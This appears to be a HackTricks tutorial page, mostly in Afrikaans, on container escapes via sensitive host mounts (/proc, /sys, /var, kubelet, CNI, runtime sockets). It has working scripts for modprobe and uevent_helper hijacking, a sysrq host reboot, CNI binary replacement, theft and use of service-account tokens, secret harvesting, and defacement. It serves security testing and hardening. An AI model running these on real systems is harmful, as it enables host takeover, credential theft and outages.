# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese container-escape oppervlaktes omdat hulle dikwels ’n noukeurig geïsoleerde prosesview terug laat in direkte sigbaarheid van host-bronne. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, of device-verwante paths kan kernel controls, credentials, neighboring container filesystems, en runtime management interfaces blootstel.

Hierdie bladsy bestaan apart van die individuele protection-bladsye omdat die abuse model kruis-snydend is. ’n Skryfbare host mount is gevaarlik deels weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-bedekking, en deels weens watter presiese host path blootgestel is. Om dit as sy eie onderwerp te behandel maak die aanvaloppervlak baie makliker om oor te redeneer.

## `/proc` Exposure

procfs bevat beide gewone proses-inligting en hoë-impak kernel control interfaces. ’n Bind mount soos `-v /proc:/host/proc` of ’n container view wat onverwags skryfbare proc entries blootstel kan dus lei tot information disclosure, denial of service, of direkte host code execution.

High-value procfs paths sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Begin deur te kyk watter high-value procfs entries sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paths is om verskillende redes interessant. `core_pattern`, `modprobe`, en `binfmt_misc` kan host code-execution paths word wanneer hulle writable is. `kallsyms`, `kmsg`, `kcore`, en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` onthul process-, cgroup-, en filesystem-konteks wat kan help om die host layout van binne die container te rekonstrueer.

Die praktiese waarde van elke path is verskillend, en om hulle almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
As dit writable is, is dit een van die hoogste-impak procfs paths omdat die kernel 'n pipe handler sal execute na 'n crash. 'n Container wat `core_pattern` na 'n payload kan wys wat in sy overlay of in 'n mounted host path gestoor is, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir 'n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
Hierdie path beheer die userspace helper wat deur die kernel gebruik word wanneer dit module-loading logic moet invoke. As dit vanaf die container writable is en in die host context geïnterpreteer word, kan dit nog 'n host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met 'n manier om die helper path te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie 'n skoon escape primitive nie, maar dit kan memory pressure omsit in host-wide denial of service deur OOM conditions in kernel panic behavior te verander.
- `/proc/sys/fs/binfmt_misc`
As die registration interface writable is, kan die attacker 'n handler vir 'n gekose magic value registreer en host-context execution verkry wanneer 'n ooreenstemmende file executed word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsystems, mitigations, en optional kernel features geaktiveer is sonder om host package metadata te benodig.
- `/proc/sysrq-trigger`
Meestal 'n denial-of-service path, maar 'n baie ernstige een. Dit kan die host onmiddellik reboot, panic, of andersins disrupt.
- `/proc/kmsg`
Onthul kernel ring buffer messages. Nuttig vir host fingerprinting, crash analysis, en in sommige omgewings vir die leak van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer leesbaar, omdat dit exported kernel symbol inligting blootstel en kan help om address randomization assumptions te defeat tydens kernel exploit development.
- `/proc/[pid]/mem`
Dit is 'n direkte process-memory interface. As die target process bereik kan word met die nodige ptrace-style conditions, kan dit toelaat om 'n ander process se memory te lees of te wysig. Die realistiese impak hang sterk af van credentials, `hidepid`, Yama, en ptrace restrictions, so dit is 'n kragtige maar conditional path.
- `/proc/kcore`
Stel 'n core-image-style view van system memory bloot. Die file is groot en onhandig om te gebruik, maar as dit betekenisvol leesbaar is, dui dit op 'n swak blootgestelde host memory surface.
- `/proc/kmem` and `/proc/mem`
Historiese high-impact raw memory interfaces. Op baie moderne systems is hulle disabled of swaar restricted, maar as hulle teenwoordig en bruikbaar is, moet hulle as critical findings behandel word.
- `/proc/sched_debug`
Lek scheduling en task inligting wat host process identities kan blootstel selfs wanneer ander process views skoner lyk as wat verwag word.
- `/proc/[pid]/mountinfo`
Uiterste nuttig om te rekonstrueer waar die container regtig op die host leef, watter paths overlay-backed is, en of 'n writable mount ooreenstem met host content of slegs met die container layer.

As `/proc/[pid]/mountinfo` of overlay details leesbaar is, gebruik hulle om die host path van die container filesystem te herstel:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat ’n aantal host-execution-truuks vereis dat ’n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se oogpunt.

### Full Example: `modprobe` Helper Path Abuse

As `/proc/sys/kernel/modprobe` skryfbaar is vanaf die container en die helper-pad in die host-konteks geïnterpreteer word, kan dit herlei word na ’n payload wat deur die aanvaller beheer word:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese trigger hang af van die teiken en kernel-gedrag, maar die belangrike punt is dat 'n skryfbare helper-pad 'n toekomstige kernel helper-aanroep kan herlei na aanvaller-beheerde host-pad-inhoud.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

As die doel uitbuitbaarheid-assessering is eerder as onmiddellike escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help om te antwoord of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand onthul, en watter kernel-features of mitigations saamgestel is. Die impak is gewoonlik nie direkte escape nie, maar dit kan kernel-vulnerability triage skerp verkort.

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is onmiddelike herlaai van die host. Dit is nie ’n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs exposure baie ernstiger kan wees as information disclosure.

## `/sys` Exposure

sysfs stel groot hoeveelhede kernel- en device-status bloot. Sommige sysfs paths is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper execution, device-gedrag, security-module configuration, of firmware-status kan beïnvloed.

High-value sysfs paths sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paths is om verskillende redes belangrik. `/sys/class/thermal` kan thermal-management gedrag beïnvloed en dus host stability in swak blootgestelde omgewings. `/sys/kernel/vmcoreinfo` kan crash-dump- en kernel-layout-inligting lek wat help met low-level host fingerprinting. `/sys/kernel/security` is die `securityfs` interface wat deur Linux Security Modules gebruik word, so onverwante toegang daar kan MAC-related status blootstel of verander. EFI variable paths kan firmware-ondersteunde boot settings beïnvloed, wat hulle baie ernstiger maak as gewone configuration files. `debugfs` onder `/sys/kernel/debug` is veral gevaarlik omdat dit doelbewus ’n developer-oriented interface is met baie minder safety expectations as hardened production-facing kernel APIs.

Nuttige review commands vir hierdie paths is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat daardie commands interessant maak:

- `/sys/kernel/security` kan onthul of AppArmor, SELinux, of 'n ander LSM surface sigbaar is op 'n manier wat host-only moes gebly het.
- `/sys/kernel/debug` is dikwels die mees kommerwekkende finding in hierdie groep. As `debugfs` gemount en leesbaar of skryfbaar is, verwag 'n wye kernel-facing surface waarvan die presiese risiko afhang van die enabled debug nodes.
- EFI variable exposure is minder algemeen, maar as dit teenwoordig is, is dit high impact omdat dit firmware-backed settings raak eerder as gewone runtime files.
- `/sys/class/thermal` is hoofsaaklik relevant vir host stability en hardware interaction, nie vir 'n netjiese shell-style escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik 'n host-fingerprinting en crash-analysis source, nuttig om low-level kernel state te verstaan.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk, is dat die helper-pad geïnterpreteer word vanuit die host se perspektief. Sodra dit geaktiveer word, loop die helper in die host-konteks eerder as binne die huidige container.

## `/var` Blootstelling

Om die host se `/var` in 'n container te mount, word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om runtime sockets, container snapshot directories, kubelet-bestuurde pod volumes, geprojekteerde service-account tokens, en naburige application filesystems te bereik. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container state werklik woon.

### Kubernetes Voorbeeld

'n pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay snapshot content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle antwoord of die mount net vervelige application data of hoë-impak cluster credentials blootstel. ’n Leesbare service-account token kan local code execution onmiddellik in Kubernetes API access verander.

As die token teenwoordig is, valideer wat dit kan bereik in plaas daarvan om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan baie groter wees as plaaslike node-toegang. 'n Token met wye RBAC kan 'n gemonteerde `/var` in 'n cluster-wye compromise verander.

### Docker En containerd Example

Op Docker hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-gebaseerde Kubernetes nodes onder `/var/lib/containerd` of snapshotter-spesifieke paths kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van ’n ander workload blootstel, kan die aanvaller moontlik application files verander, web content plaas, of startup scripts wysig sonder om die current container configuration aan te raak.

Konkrete abuse ideas sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie commands is nuttig omdat hulle die drie hoof impakfamilies van gemonteerde `/var` wys: application tampering, secret recovery, en lateral movement na naburige workloads.

## Kubelet State, Plugins, En CNI Paths

'n Mount van `/var/lib/kubelet`, `/opt/cni/bin`, of `/etc/cni/net.d` word dikwels blootgestel deur privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, en storage helpers. Hierdie mounts is maklik om af te skryf as "node plumbing", maar hulle sit direk in die execution path vir nuwe pods en bevat dikwels kubelet credentials, projected secrets, registration sockets, en executable host-side plugin binaries.

High-value targets sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige review commands is:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Waarom hierdie paths saak maak:

- `/var/lib/kubelet/pki` kan kubelet client certificates en ander node-local credentials blootstel wat soms hergebruik kan word teen die API server of kubelet-facing TLS endpoints, afhangende van cluster design.
- `/var/lib/kubelet/pods` bevat dikwels projected service-account tokens en mounted Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n reconnaissance surface, maar ’n baie nuttige een: dit wys watter pods en containers tans GPUs, hugepages, SR-IOV devices, en ander scarce node-local resources besit.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, en `/var/lib/kubelet/plugins_registry` wys watter CSI, DRA, en device plugins geïnstalleer is en met watter sockets die kubelet verwag om te praat. As daardie directories writable is eerder as net readable, word die finding baie ernstiger.
- `/opt/cni/bin` en `/etc/cni/net.d` sit direk op die pod-network setup path. Writable access daar is dikwels ’n delayed host-execution primitive eerder as net configuration exposure.

### Full Example: Writable `/opt/cni/bin`

As ’n host CNI binary directory read-write gemount is, kan die vervanging van ’n plugin genoeg wees om host execution te verkry die volgende keer wat die kubelet ’n pod sandbox op daardie node skep:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur pods. Die belangrike punt is dat die gewysigde binary later deur die host network setup flow uitgevoer word, nie deur die huidige container nie.


## Runtime Sockets

Sensitive host mounts sluit dikwels runtime sockets in eerder as volledige directories. Hulle is so belangrik dat hulle hier eksplisiet herhaal verdien:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation-vloei sodra een van hierdie sockets gemount is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een van hierdie slaag, is die pad van "mounted socket" na "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout path.

## Mount-Related CVEs

Host mounts sny ook oor met runtime vulnerabilities. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar 'n leaked directory file descriptor die working directory op die host filesystem kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652`, en `CVE-2024-23653` in BuildKit, waar malicious Dockerfiles, frontends, en `RUN --mount` flows host file access, deletion, of elevated privileges tydens builds kon herintroduceer.
- `CVE-2024-1753` in Buildah en Podman build flows, waar crafted bind mounts tydens build `/` read-write kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar 'n TOCTOU tydens image unpack 'n specially crafted image kon laat toe om die host filesystem tydens pull te modify.

Hierdie CVEs maak hier saak omdat hulle wys dat mount handling nie net oor operator configuration gaan nie. Die runtime self kan ook mount-driven escape conditions introduceer.

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat is interessant hier:

- Host root, `/proc`, `/sys`, `/var`, en runtime sockets is almal hoë-prioriteit findings.
- Skryfbare proc/sys entries beteken dikwels dat die mount host-global kernel controls blootstel eerder as 'n veilige container view.
- Gemounte `/var` paths verdien credential en neighboring-workload review, nie net filesystem review nie.
- Kubelet state directories en CNI/plugin paths verdien dieselfde prioriteit as runtime sockets omdat hulle dikwels direk op die node se pod-creation en credential-distribution pad sit.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
